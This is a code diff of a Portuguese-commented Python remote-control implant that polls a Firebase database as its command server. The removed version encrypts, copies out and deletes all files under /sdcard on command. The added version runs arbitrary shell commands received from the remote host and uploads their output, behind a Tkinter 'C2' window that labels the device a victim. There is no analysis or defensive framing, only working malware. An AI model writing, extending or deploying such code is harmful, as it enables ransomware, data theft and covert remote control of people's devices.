@@ -1,158 +1,102 @@
+import tkinter as tk
+from tkinter import ttk
+import requests
 import os
 import time
-import base64
 import json
-import requests
-import platform
-from datetime import datetime
-from hashlib import sha256
-from Crypto.Cipher import AES
 
-# --- Configuração ---
-database_url = "https://vibe-chat-b1e67-default-rtdb.firebaseio.com"
-vitima_id = "KIRA-PC"  # Mude para algo único por dispositivo
-senha = "hackerkira12345"
-pasta_alvo = "/sdcard"
-url_base = f"{database_url}/vítimas/{vitima_id}"
+# Firebase
+firebase_url = "https://vibe-chat-b1e67-default-rtdb.firebaseio.com"
+vitima_id = os.environ.get("USER", "vitima_kira")  # Nome da vítima
 
-# --- Utilidades ---
-def gerar_chave(senha):
-    return sha256(senha.encode()).digest()
-
-def preencher(bloco):
-    while len(bloco) % 16 != 0:
-        bloco += b' '
-    return bloco
-
-def enviar_resposta(nome_comando, dados):
+def buscar_comando():
     try:
-        requests.put(f"{url_base}/resposta.json", data=json.dumps({nome_comando: dados}))
-    except:
-        pass
+        response = requests.get(f"{firebase_url}/comandos/{vitima_id}.json")
+        if response.status_code == 200 and response.text != "null":
+            comando = response.json()
+            executar_comando(comando)
+    except Exception as e:
+        print("Erro ao buscar comando:", e)
 
-# --- Comandos ---
-def criptografar():
-    chave = gerar_chave(senha)
-    total = 0
-    for dirpath, _, files in os.walk(pasta_alvo):
-        for file in files:
-            path = os.path.join(dirpath, file)
+def executar_comando(comando):
+    if not comando:
+        return
+    categoria = comando.get("categoria")
+    acao = comando.get("acao")
+
+    # Exemplo de comandos por categoria
+    if categoria == "sistema":
+        if acao == "listar_arquivos":
+            arquivos = os.listdir(".")
+            resposta = "\n".join(arquivos)
+        elif acao == "info_usuario":
+            resposta = f"Usuário: {vitima_id}"
+        else:
+            resposta = "Comando desconhecido"
+    elif categoria == "mensagem":
+        if acao == "alerta":
+            os.system("termux-toast '⚠️ ALERTA RECEBIDO DO PAINEL'")
+            resposta = "Alerta exibido"
+        elif acao == "popup":
+            os.system("termux-dialog --title 'Comando' --text 'Você recebeu um aviso.'")
+            resposta = "Popup exibido"
+        else:
+            resposta = "Comando desconhecido"
+    elif categoria == "shell":
+        if acao.startswith("cmd:"):
             try:
-                with open(path, "rb") as f:
-                    dados = f.read()
-                cipher = AES.new(chave, AES.MODE_ECB)
-                cifrado = cipher.encrypt(preencher(dados))
-                with open(path, "wb") as f:
-                    f.write(cifrado)
-                total += 1
-            except:
-                continue
-    enviar_resposta("criptografar", f"{total} arquivos criptografados.")
+                saida = os.popen(acao[4:]).read()
+                resposta = saida or "Comando executado"
+            except Exception as e:
+                resposta = f"Erro: {str(e)}"
+        else:
+            resposta = "Shell inválido"
+    else:
+        resposta = "Categoria inválida"
 
-def descriptografar():
-    chave = gerar_chave(senha)
-    total = 0
-    for dirpath, _, files in os.walk(pasta_alvo):
-        for file in files:
-            path = os.path.join(dirpath, file)
-            try:
-                with open(path, "rb") as f:
-                    dados = f.read()
-                cipher = AES.new(chave, AES.MODE_ECB)
-                decifrado = cipher.decrypt(dados).rstrip(b' ')
-                with open(path, "wb") as f:
-                    f.write(decifrado)
-                total += 1
-            except:
-                continue
-    enviar_resposta("descriptografar", f"{total} arquivos descriptografados.")
+    # Enviar resultado para Firebase
+    requests.put(f"{firebase_url}/respostas/{vitima_id}.json", json.dumps({"resposta": resposta}))
 
-def listar_arquivos():
-    arquivos = []
-    for dirpath, _, files in os.walk(pasta_alvo):
-        for file in files:
-            arquivos.append(os.path.join(dirpath, file))
-    enviar_resposta("listar_arquivos", arquivos)
+def atualizar_comandos():
+    buscar_comando()
+    root.after(5000, atualizar_comandos)  # A cada 5 segundos
 
-def copiar_arquivos():
-    copiados = []
-    for dirpath, _, files in os.walk(pasta_alvo):
-        for file in files:
-            path = os.path.join(dirpath, file)
-            try:
-                with open(path, "rb") as f:
-                    conteudo = base64.b64encode(f.read()).decode()
-                nome_seguro = file.replace(".", "_")
-                requests.put(f"{url_base}/copias/{nome_seguro}.json", data=json.dumps(conteudo))
-                copiados.append(file)
-            except:
-                continue
-    enviar_resposta("copiar_arquivos", f"{len(copiados)} arquivos copiados.")
+def mostrar_interface():
+    root = tk.Tk()
+    root.title(f"[VÍTIMA] Conectada como {vitima_id}")
+    root.geometry("700x400")
+    root.configure(bg="black")
 
-def deletar_arquivos():
-    deletados = 0
-    for dirpath, _, files in os.walk(pasta_alvo):
-        for file in files:
-            try:
-                os.remove(os.path.join(dirpath, file))
-                deletados += 1
-            except:
-                continue
-    enviar_resposta("deletar_arquivos", f"{deletados} arquivos deletados.")
+    label = tk.Label(root, text="💀 Sistema C2 - Escutando comandos...", fg="lime", bg="black", font=("Consolas", 14))
+    label.pack(pady=10)
 
-def mostrar_mensagem():
-    try:
-        os.system("termux-toast '⚠️ Alerta do servidor C2 ⚠️'")
-        enviar_resposta("mostrar_mensagem", "Mensagem exibida com sucesso.")
-    except:
-        enviar_resposta("mostrar_mensagem", "Erro ao exibir mensagem.")
+    categoria_label = tk.Label(root, text="Categorias disponíveis:", fg="white", bg="black")
+    categoria_label.pack()
 
-def capturar_data():
-    agora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    enviar_resposta("capturar_data", agora)
-
-def enviar_info():
-    info = {
-        "sistema": platform.system(),
-        "versao": platform.version(),
-        "nome": platform.node(),
-        "plataforma": platform.platform(),
+    categorias = {
+        "sistema": ["listar_arquivos", "info_usuario"],
+        "mensagem": ["alerta", "popup"],
+        "shell": ["cmd:ls", "cmd:whoami", "cmd:date"]
+        # Aqui você pode adicionar 15 categorias com até 15 comandos
     }
-    enviar_resposta("enviar_info", info)
 
-# --- Loop principal ---
-def escutar():
-    requests.put(f"{url_base}/status.json", data=json.dumps(True))
-    while True:
-        try:
-            resp = requests.get(f"{url_base}/comando.json")
-            if resp.status_code == 200:
-                comando = resp.json()
-                if comando:
-                    print(f"🚨 COMANDO RECEBIDO: {comando}")
-                    if comando == "criptografar":
-                        criptografar()
-                    elif comando == "descriptografar":
-                        descriptografar()
-                    elif comando == "listar_arquivos":
-                        listar_arquivos()
-                    elif comando == "copiar_arquivos":
-                        copiar_arquivos()
-                    elif comando == "deletar_arquivos":
-                        deletar_arquivos()
-                    elif comando == "mostrar_mensagem":
-                        mostrar_mensagem()
-                    elif comando == "capturar_data":
-                        capturar_data()
-                    elif comando == "enviar_info":
-                        enviar_info()
+    tree = ttk.Treeview(root)
+    tree["columns"] = ("Comandos")
+    tree.heading("#0", text="Categoria")
+    tree.heading("Comandos", text="Comandos")
+    tree.column("Comandos", width=400)
 
-                    # Limpa o comando após execução
-                    requests.put(f"{url_base}/comando.json", data=json.dumps(None))
-            time.sleep(3)
-        except:
-            time.sleep(5)
+    for cat, cmds in categorias.items():
+        node = tree.insert("", "end", text=cat)
+        for cmd in cmds:
+            tree.insert(node, "end", text="", values=(cmd))
 
-# --- Execução ---
+    tree.pack(expand=True, fill="both")
+
+    root.after(5000, atualizar_comandos)
+    root.mainloop()
+
 if __name__ == "__main__":
-    escutar()
+    root = tk.Tk()
+    root.withdraw()
+    mostrar_interface()
